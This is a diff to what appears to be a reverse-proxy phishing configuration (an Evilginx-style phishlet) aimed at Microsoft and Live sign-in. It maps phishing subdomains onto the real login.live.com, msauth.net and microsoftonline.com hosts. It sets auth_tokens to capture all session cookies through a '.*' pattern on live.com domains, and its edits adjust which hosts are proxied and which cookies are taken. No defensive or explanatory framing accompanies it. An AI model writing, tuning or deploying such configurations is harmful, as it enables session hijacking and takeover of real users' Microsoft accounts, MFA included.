@@ -4,20 +4,14 @@ proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}  
-  - {phish_sub: 'storage', orig_sub: 'storage', domain: 'live.com', session: true, is_landing: false, auto_filter: true}  
-  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'microsoft', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login.microsoftonline', orig_sub: 'login', domain: 'microsoftonline.com', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true} 
-  - {phish_sub: 'ssl', orig_sub: 'compass-ssl', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
 auth_tokens:
   - domain: '.login.live.com'
-    keys: ['MSPOK','.*,regexp']
+    keys: ['.*,regexp']
   - domain: '.live.com'
-    keys: ['.*,regexp']
-  - domain: '.microsoft.com'
-    keys: ['.*,regexp']
-  - domain: '.account.microsoft.com'
-    keys: ['.*,regexp']      
+    keys: ['.*,regexp']    
 auth_urls:
   - '/'
   - '/*'  
